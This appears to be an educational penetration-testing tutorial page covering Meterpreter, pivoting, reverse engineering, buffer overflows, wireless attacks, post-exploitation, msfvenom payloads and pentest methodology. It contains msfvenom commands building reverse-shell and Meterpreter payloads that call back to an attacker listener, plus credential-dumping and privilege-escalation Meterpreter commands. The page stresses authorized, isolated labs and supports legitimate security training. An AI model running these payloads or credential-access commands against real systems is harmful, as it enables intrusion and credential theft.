01

Advanced Metasploit

Beyond running a single exploit module, real Metasploit usage revolves around Meterpreter — an in-memory post-exploitation agent — session management across multiple compromised hosts, and pivoting your attack traffic through a host you've already compromised to reach machines that weren't directly reachable before.

Meterpreter fundamentals

meterpreter
meterpreter > sysinfo               # OS, hostname, architecture
meterpreter > getuid                 # current user context
meterpreter > ps                      # list running processes
meterpreter > migrate 1240             # move the session into another process for stability
meterpreter > background               # return to msfconsole, keep the session alive

Managing multiple sessions & pivoting

msfconsole
msf6 > sessions -l                    # list active sessions
msf6 > sessions -i 2                  # interact with session 2
msf6 > route add 172.16.0.0/24 2      # pivot: route this subnet through session 2
msf6 > use auxiliary/scanner/portscan/tcp

Pivoting means an internal subnet that was never directly reachable from your Kali box becomes reachable through the compromised host's own network connection — a core technique in any multi-tier lab like the Active Directory project later in this track.

Working with the database

  • msfdb init — sets up Metasploit's PostgreSQL-backed database for storing scan and session data
  • workspace -a client-lab — keeps different engagements' data separated
  • hosts, services, creds — query what Metasploit has already learned about your lab
02

Reverse engineering tools

Reverse engineering is the practice of analyzing a compiled binary to understand what it does without having its source code — essential for malware analysis, vulnerability research, and CTF "reversing" challenges. Kali includes a full static- and dynamic-analysis toolchain.

Static analysis — reading without running

bash
$ file challenge.bin           # identify file type, architecture
$ strings challenge.bin | less  # pull readable text out of the binary
$ objdump -d challenge.bin      # disassemble to raw assembly
  • Ghidra — the NSA-developed, free disassembler/decompiler; turns assembly back into readable pseudo-C, the standard starting point for serious analysis
  • radare2 / rizin — terminal-based reverse engineering frameworks with scripting support

Dynamic analysis — watching it run

gdb
$ gdb ./challenge
(gdb) break main
(gdb) run
(gdb) info registers
(gdb) disassemble
  • GDB with the GEF or PEDA extensions adds much friendlier output for exploit development work
  • Dynamic analysis lets you set breakpoints, step through instructions, and inspect memory and registers as the program actually executes — this is the same discipline used in the buffer overflow module next

Practice on CTF-style binariesSites like crackmes.one and the reversing categories on picoCTF and HackTheBox provide binaries built specifically to be reverse-engineered, so you're never analyzing something you don't have the right to.

03

Buffer overflow basics

A stack-based buffer overflow happens when a program writes more data into a fixed-size buffer than it was sized for, overwriting adjacent memory — including, if the offset is right, the saved return address (EIP on 32-bit x86). Control that address and you control where execution jumps next. Modern systems mitigate this with stack canaries, DEP, and ASLR, but the classic technique is still the foundation every exploit developer learns first, and it's taught almost universally against one intentionally vulnerable practice program.

The standard learning workflow

  • Run a purpose-built vulnerable TCP application (the classic teaching target is the open-source "vulnserver") in an isolated Windows lab VM, attached to a debugger like Immunity Debugger with the mona.py plugin
  • Fuzz — send progressively longer input strings from Kali until the debugger shows the program crash
  • Find the offset — generate a unique cyclic pattern and use it to find exactly how many bytes precede the return address
  • Control EIP — confirm you can overwrite the return address with a known 4-byte value
  • Find bad characters — identify bytes (like \x00) that corrupt your payload when sent, so you know what to avoid
  • Find a JMP ESP — locate a reliable instruction in a non-randomized module to redirect execution into your shellcode
  • Generate shellcode — build a payload with msfvenom, avoiding the bad characters you identified
kali — recon & payload generation
# 1. generate a cyclic pattern to find the EIP offset
$ msf-pattern_create -l 600

# 2. once you have the crash value from the debugger, find its offset
$ msf-pattern_offset -l 600 -q <value_from_EIP>

# 3. generate shellcode once bad characters are known (placeholders below —
#    you determine the real offset and JMP ESP address yourself, in your own lab)
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.10.10 LPORT=4444 \
    -b "\x00\x0a\x0d" -f python -v shellcode

This is an outline, not a scriptEvery offset and address above is specific to the exact binary, build, and lab you're running — that's intentional. Buffer overflow exploit development is a hands-on debugging skill, not something you can copy-paste; you're expected to work through each step yourself in a debugger against your own isolated lab VM.

04

Advanced wireless attacks

Beyond capturing a WPA handshake, advanced wireless testing covers attacking the WPS mechanism, setting up rogue access points for social-engineering-style tests, and newer clientless attacks that don't require waiting for a device to reconnect.

Categories you'll encounter

  • WPS attacks — tools like Reaver and Bully target the WPS PIN mechanism on routers that still have it enabled, which is far weaker than the WPA2 passphrase itself
  • PMKID attacks — hcxdumptool can sometimes capture enough data to attempt a passphrase attack without ever seeing a full 4-way handshake or deauthenticating anyone
  • Evil Twin / rogue AP — tools like airbase-ng create a fake access point mimicking a real one, used in authorized engagements to test whether users can be tricked into connecting
  • Captive portal attacks — combine a rogue AP with a fake login page to test organizational security-awareness, always as part of a scoped, consented engagement

This is the highest-liability category on this siteRogue access points and deauthentication affect anyone nearby, not just your target — running these outside a dedicated, owned lab or a formally scoped, written engagement is both illegal and disruptive to real people. This hub covers what these tools do conceptually; it does not walk through operating them against a live target.

05

Post-exploitation techniques

Getting a shell is the beginning of an assessment, not the end. Post-exploitation is about understanding how far an attacker could actually go from that foothold — the answer to "so what?" that turns a technical finding into a business risk a client can act on.

What professional post-exploitation covers

  • Local enumeration — running LinPEAS/WinPEAS-style scripts to surface privilege escalation paths automatically
  • Credential harvesting — extracting cached credentials or hashes on a host you already control, then using tools like hashdump in Meterpreter to feed into John or Hashcat
  • Lateral movement — using credentials or trust relationships found on one host to reach the next, exactly the pivoting technique from the Advanced Metasploit module
  • Persistence — techniques an attacker could use to survive a reboot, studied so defenders know what to look for, and always removed at the end of an authorized test
  • Data-handling discipline — real engagements define exactly what counts as "proof" (a screenshot, a hostname) vs. what should never be exfiltrated, even during an authorized test
meterpreter
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > load kiwi                    # credential-access extension (Windows, needs admin)
meterpreter > getsystem                     # attempt automatic privilege escalation

This is why reporting mattersEverything in this module exists to answer one question for a client: "what's the real-world impact if this entry point isn't fixed?" That question — not the exploit itself — is the actual deliverable of a professional pentest.

06

Custom payload development

Msfvenom is Metasploit's standalone payload generator — the same tool referenced earlier for buffer overflow shellcode, but worth understanding as its own subject: how a payload is built, encoded, and packaged for different targets and delivery methods.

Generating a basic payload

bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.0.10.10 LPORT=4444 -f exe -o payload.exe

$ msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=10.0.10.10 LPORT=4444 -f elf -o payload.elf
  • -p selects the payload; naming follows platform/arch/type
  • LHOST / LPORT is where the payload calls back to — your Kali VM, listening with a matching multi/handler
  • -f sets the output format: exe, elf, python, raw, and more
  • Staged payloads (like reverse_tcp) send a small stager first, then pull the full payload over the connection; stageless payloads (reverse_tcp vs meterpreter/reverse_tcp variants) send everything at once

Why "encoding" isn't real evasion anymore

Older material talks about msfvenom's -e encoders as an antivirus bypass technique. In practice, every mainstream antivirus and EDR product has signatures for Metasploit's default encoders — they no longer evade real security software. Understanding why they fail (signature-based detection, behavioral analysis, memory scanning) matters more than the encoder flags themselves; genuine evasion is a specialized discipline built on custom tooling, not a one-line flag.

A payload is software, not a toyBuilding and running a payload outside a lab you control — even "just to see if it works" — is the same as deploying malware. Every payload you generate here should call back to your own Kali VM, on your own isolated network, against your own target.

07

Full pentesting methodology

Everything in this hub is a piece of a larger, disciplined process. Professional engagements follow a structured methodology — loosely based on frameworks like PTES (Penetration Testing Execution Standard), the OWASP Testing Guide, and NIST SP 800-115 — so findings are reproducible, safe, and legally defensible.

The five phases

  • 0. Pre-engagement — scope, rules of engagement, emergency contacts, and a signed authorization letter, before a single tool runs
  • 1. Reconnaissance — passive and active information gathering: WHOIS, DNS records, employee names, exposed subdomains
  • 2. Scanning & enumeration — Nmap and service-specific enumeration to build a full picture of the attack surface
  • 3. Gaining access — exploitation of a discovered vulnerability, using the tools from the intermediate and advanced tracks
  • 4. Post-exploitation — privilege escalation, lateral movement, and demonstrating real-world impact, strictly within agreed scope
  • 5. Reporting & cleanup — removing any tools, backdoors, or accounts created during testing, then delivering a report with severity ratings and remediation steps

What a good report actually contains

  • An executive summary a non-technical stakeholder can understand
  • Each finding with a severity rating, reproduction steps, evidence, and a specific fix
  • A retest section once the client has remediated, confirming the fix actually worked
